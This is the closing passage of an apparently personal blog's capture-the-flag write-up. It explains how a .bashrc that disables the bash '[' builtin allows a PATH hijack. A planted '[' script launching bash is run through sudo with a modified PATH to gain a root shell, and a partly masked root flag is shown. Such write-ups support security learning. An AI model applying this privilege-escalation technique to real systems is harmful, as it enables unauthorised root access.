class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fb0b7004848a4e5983b3ec7516b85b8f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Option 2 — Path Hijack via </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">[</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/4758c1581837470daa177356e3565de2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.bashrc</code></span><span class="SemanticString"> is essentially a configuration file for the bash shell. It’s typically located in a user’s home directory and gets called every time an interactive shell session starts. Hence, it’s certainly unusual for the cleanup script to call </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.bashrc</code></span><span class="SemanticString"> in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/</code></span><span class="SemanticString"> directory.</span></span></p></div><div id="https://www.notion.so/18eba46db6e24663a5f3b175f8207f3e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/.bashrc</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/12381326d2564b218fd78a20d535e19b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># System-wide .bashrc file for interactive bash(1) shells.</span>

<span class="token comment"># To enable the settings / commands in this file for login shells as well,</span>
<span class="token comment"># this file has to be sourced in /etc/profile.</span>

<span class="token comment"># Jameson: ensure that snaps don't interfere, 'cos they are dumb</span>
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">${<span class="token environment constant">PATH</span><span class="token operator">/</span><span class="token operator">:</span>\<span class="token operator">/</span>snap\<span class="token operator">/</span>bin<span class="token operator">/</span>}</span>

<span class="token comment"># Jameson: caused problems with testing whether to rotate the log file</span>
<span class="token builtin class-name">enable</span> <span class="token parameter variable">-n</span> <span class="token punctuation">[</span> <span class="token comment"># ]</span>

<span class="token comment"># If not running interactively, don't do anything</span>
<span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token environment constant">$PS1</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">return</span>

<span class="token comment"># check the window size after each command and, if necessary,</span>
<span class="token comment"># update the values of LINES and COLUMNS.</span>
<span class="token builtin class-name">shopt</span> <span class="token parameter variable">-s</span> checkwinsize

<span class="token operator">&lt;</span><span class="token punctuation">..</span>SNIP<span class="token punctuation">..</span><span class="token operator">></span></span></span></span></code></pre><div id="https://www.notion.so/003468c2558743d6a07a5bdb2c528c94" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The interesting line is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">enable -n [ # ]</code></span><span class="SemanticString">, where it’s disabling the bash builtin </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">[</code></span><span class="SemanticString">. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">[</code></span><span class="SemanticString"> is equivalent to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">test</code></span><span class="SemanticString">, and is used to evaluate conditional expressions.</span></span></p></div><div id="https://www.notion.so/9943f572776045759ee228b733b1e153" class="Bookmark"><a href="https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html#index-test"><h5 class="Bookmark__Title">Bourne Shell Builtins (Bash Reference Manual)</h5><p class="Bookmark__Link">https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html#index-test</p></a></div><div id="https://www.notion.so/700ae619b77843a59c3c736a87b80e37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In fact, a binary named </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">[</code></span><span class="SemanticString"> can be found in the PATH.</span></span></p></div><div id="https://www.notion.so/0f6f1c0ff2a74f788638ed4a5d1b6bac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ which [</code></span></span></p></div><pre id="https://www.notion.so/e7e6e1234b44457b8f76cdbd81e29454" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>/usr/bin/[</span></span></span></code></pre><div id="https://www.notion.so/b49d8f4bd40b42fe97e5e8eb93febfb2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Normally, this binary would not be called since the builtins will always take precedence. However, with the builtin </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">[</code></span><span class="SemanticString"> disabled in this case, the system will treat </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">[</code></span><span class="SemanticString"> as any other executables, and will also be vulnerable to path hijacking if full paths are not used.</span></span></p></div><div id="https://www.notion.so/c68aefd17b3d410b87db3f92a7161ef1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Exploiting this is exactly the same as above, except that the backdoor is now named </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">[</code></span><span class="SemanticString"> instead of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">find</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/f7adac91956b49718c5f62f8746fa8c8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/wizard/[</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/645c1d6ca25d45b88344dd7d5839666d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>

<span class="token function">bash</span></span></span></span></code></pre><div id="https://www.notion.so/515f929f9a854a40b95b1e19f87f79c2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Running the script with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sudo</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SETENV</code></span><span class="SemanticString"> would also result in a root shell.</span></span></p></div><div id="https://www.notion.so/dda3fca75cde462b8c969865384989c6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo PATH=/home/wizard:$PATH /opt/cleanup.sh</code></span></span></p></div><div id="https://www.notion.so/0d598a01bba648a3a3ff7e3404dfa0a6" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2004101d-3b50-4c33-b826-8f9784cb837f%2FUntitled.png?width=550&amp;table=block&amp;id=0d598a01-bba6-48a3-a3ff-7e3404dfa0a6"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2004101d-3b50-4c33-b826-8f9784cb837f%2FUntitled.png?width=550&amp;table=block&amp;id=0d598a01-bba6-48a3-a3ff-7e3404dfa0a6" style="width:550px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/60693d40a67946a69056e484bfce0db2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"># id</code></span></span></p></div><pre id="https://www.notion.so/cfbe2f4e5b4f4ff3a5bf0fd0c837d6ff" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/41c70d52360e47f1a857839fe2b83a4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root flag:</strong></span></span></p></div><div id="https://www.notion.so/476ff2898d544c459c1c94be8d02dcdd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"># cat root.txt</code></span></span></p></div><pre id="https://www.notion.so/133d14d0f14c4001abde728d755c6d2f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>970e1120************************</span></span></span></code></pre><div id="https://www.notion.so/51cbf804916b4933ac61422fd7300dac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/cdf0fc704a6f4d21a4cfa8e303fbecbf" class="Divider"></div></article>
  <footer class="Footer">
  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>

</body>

</html>
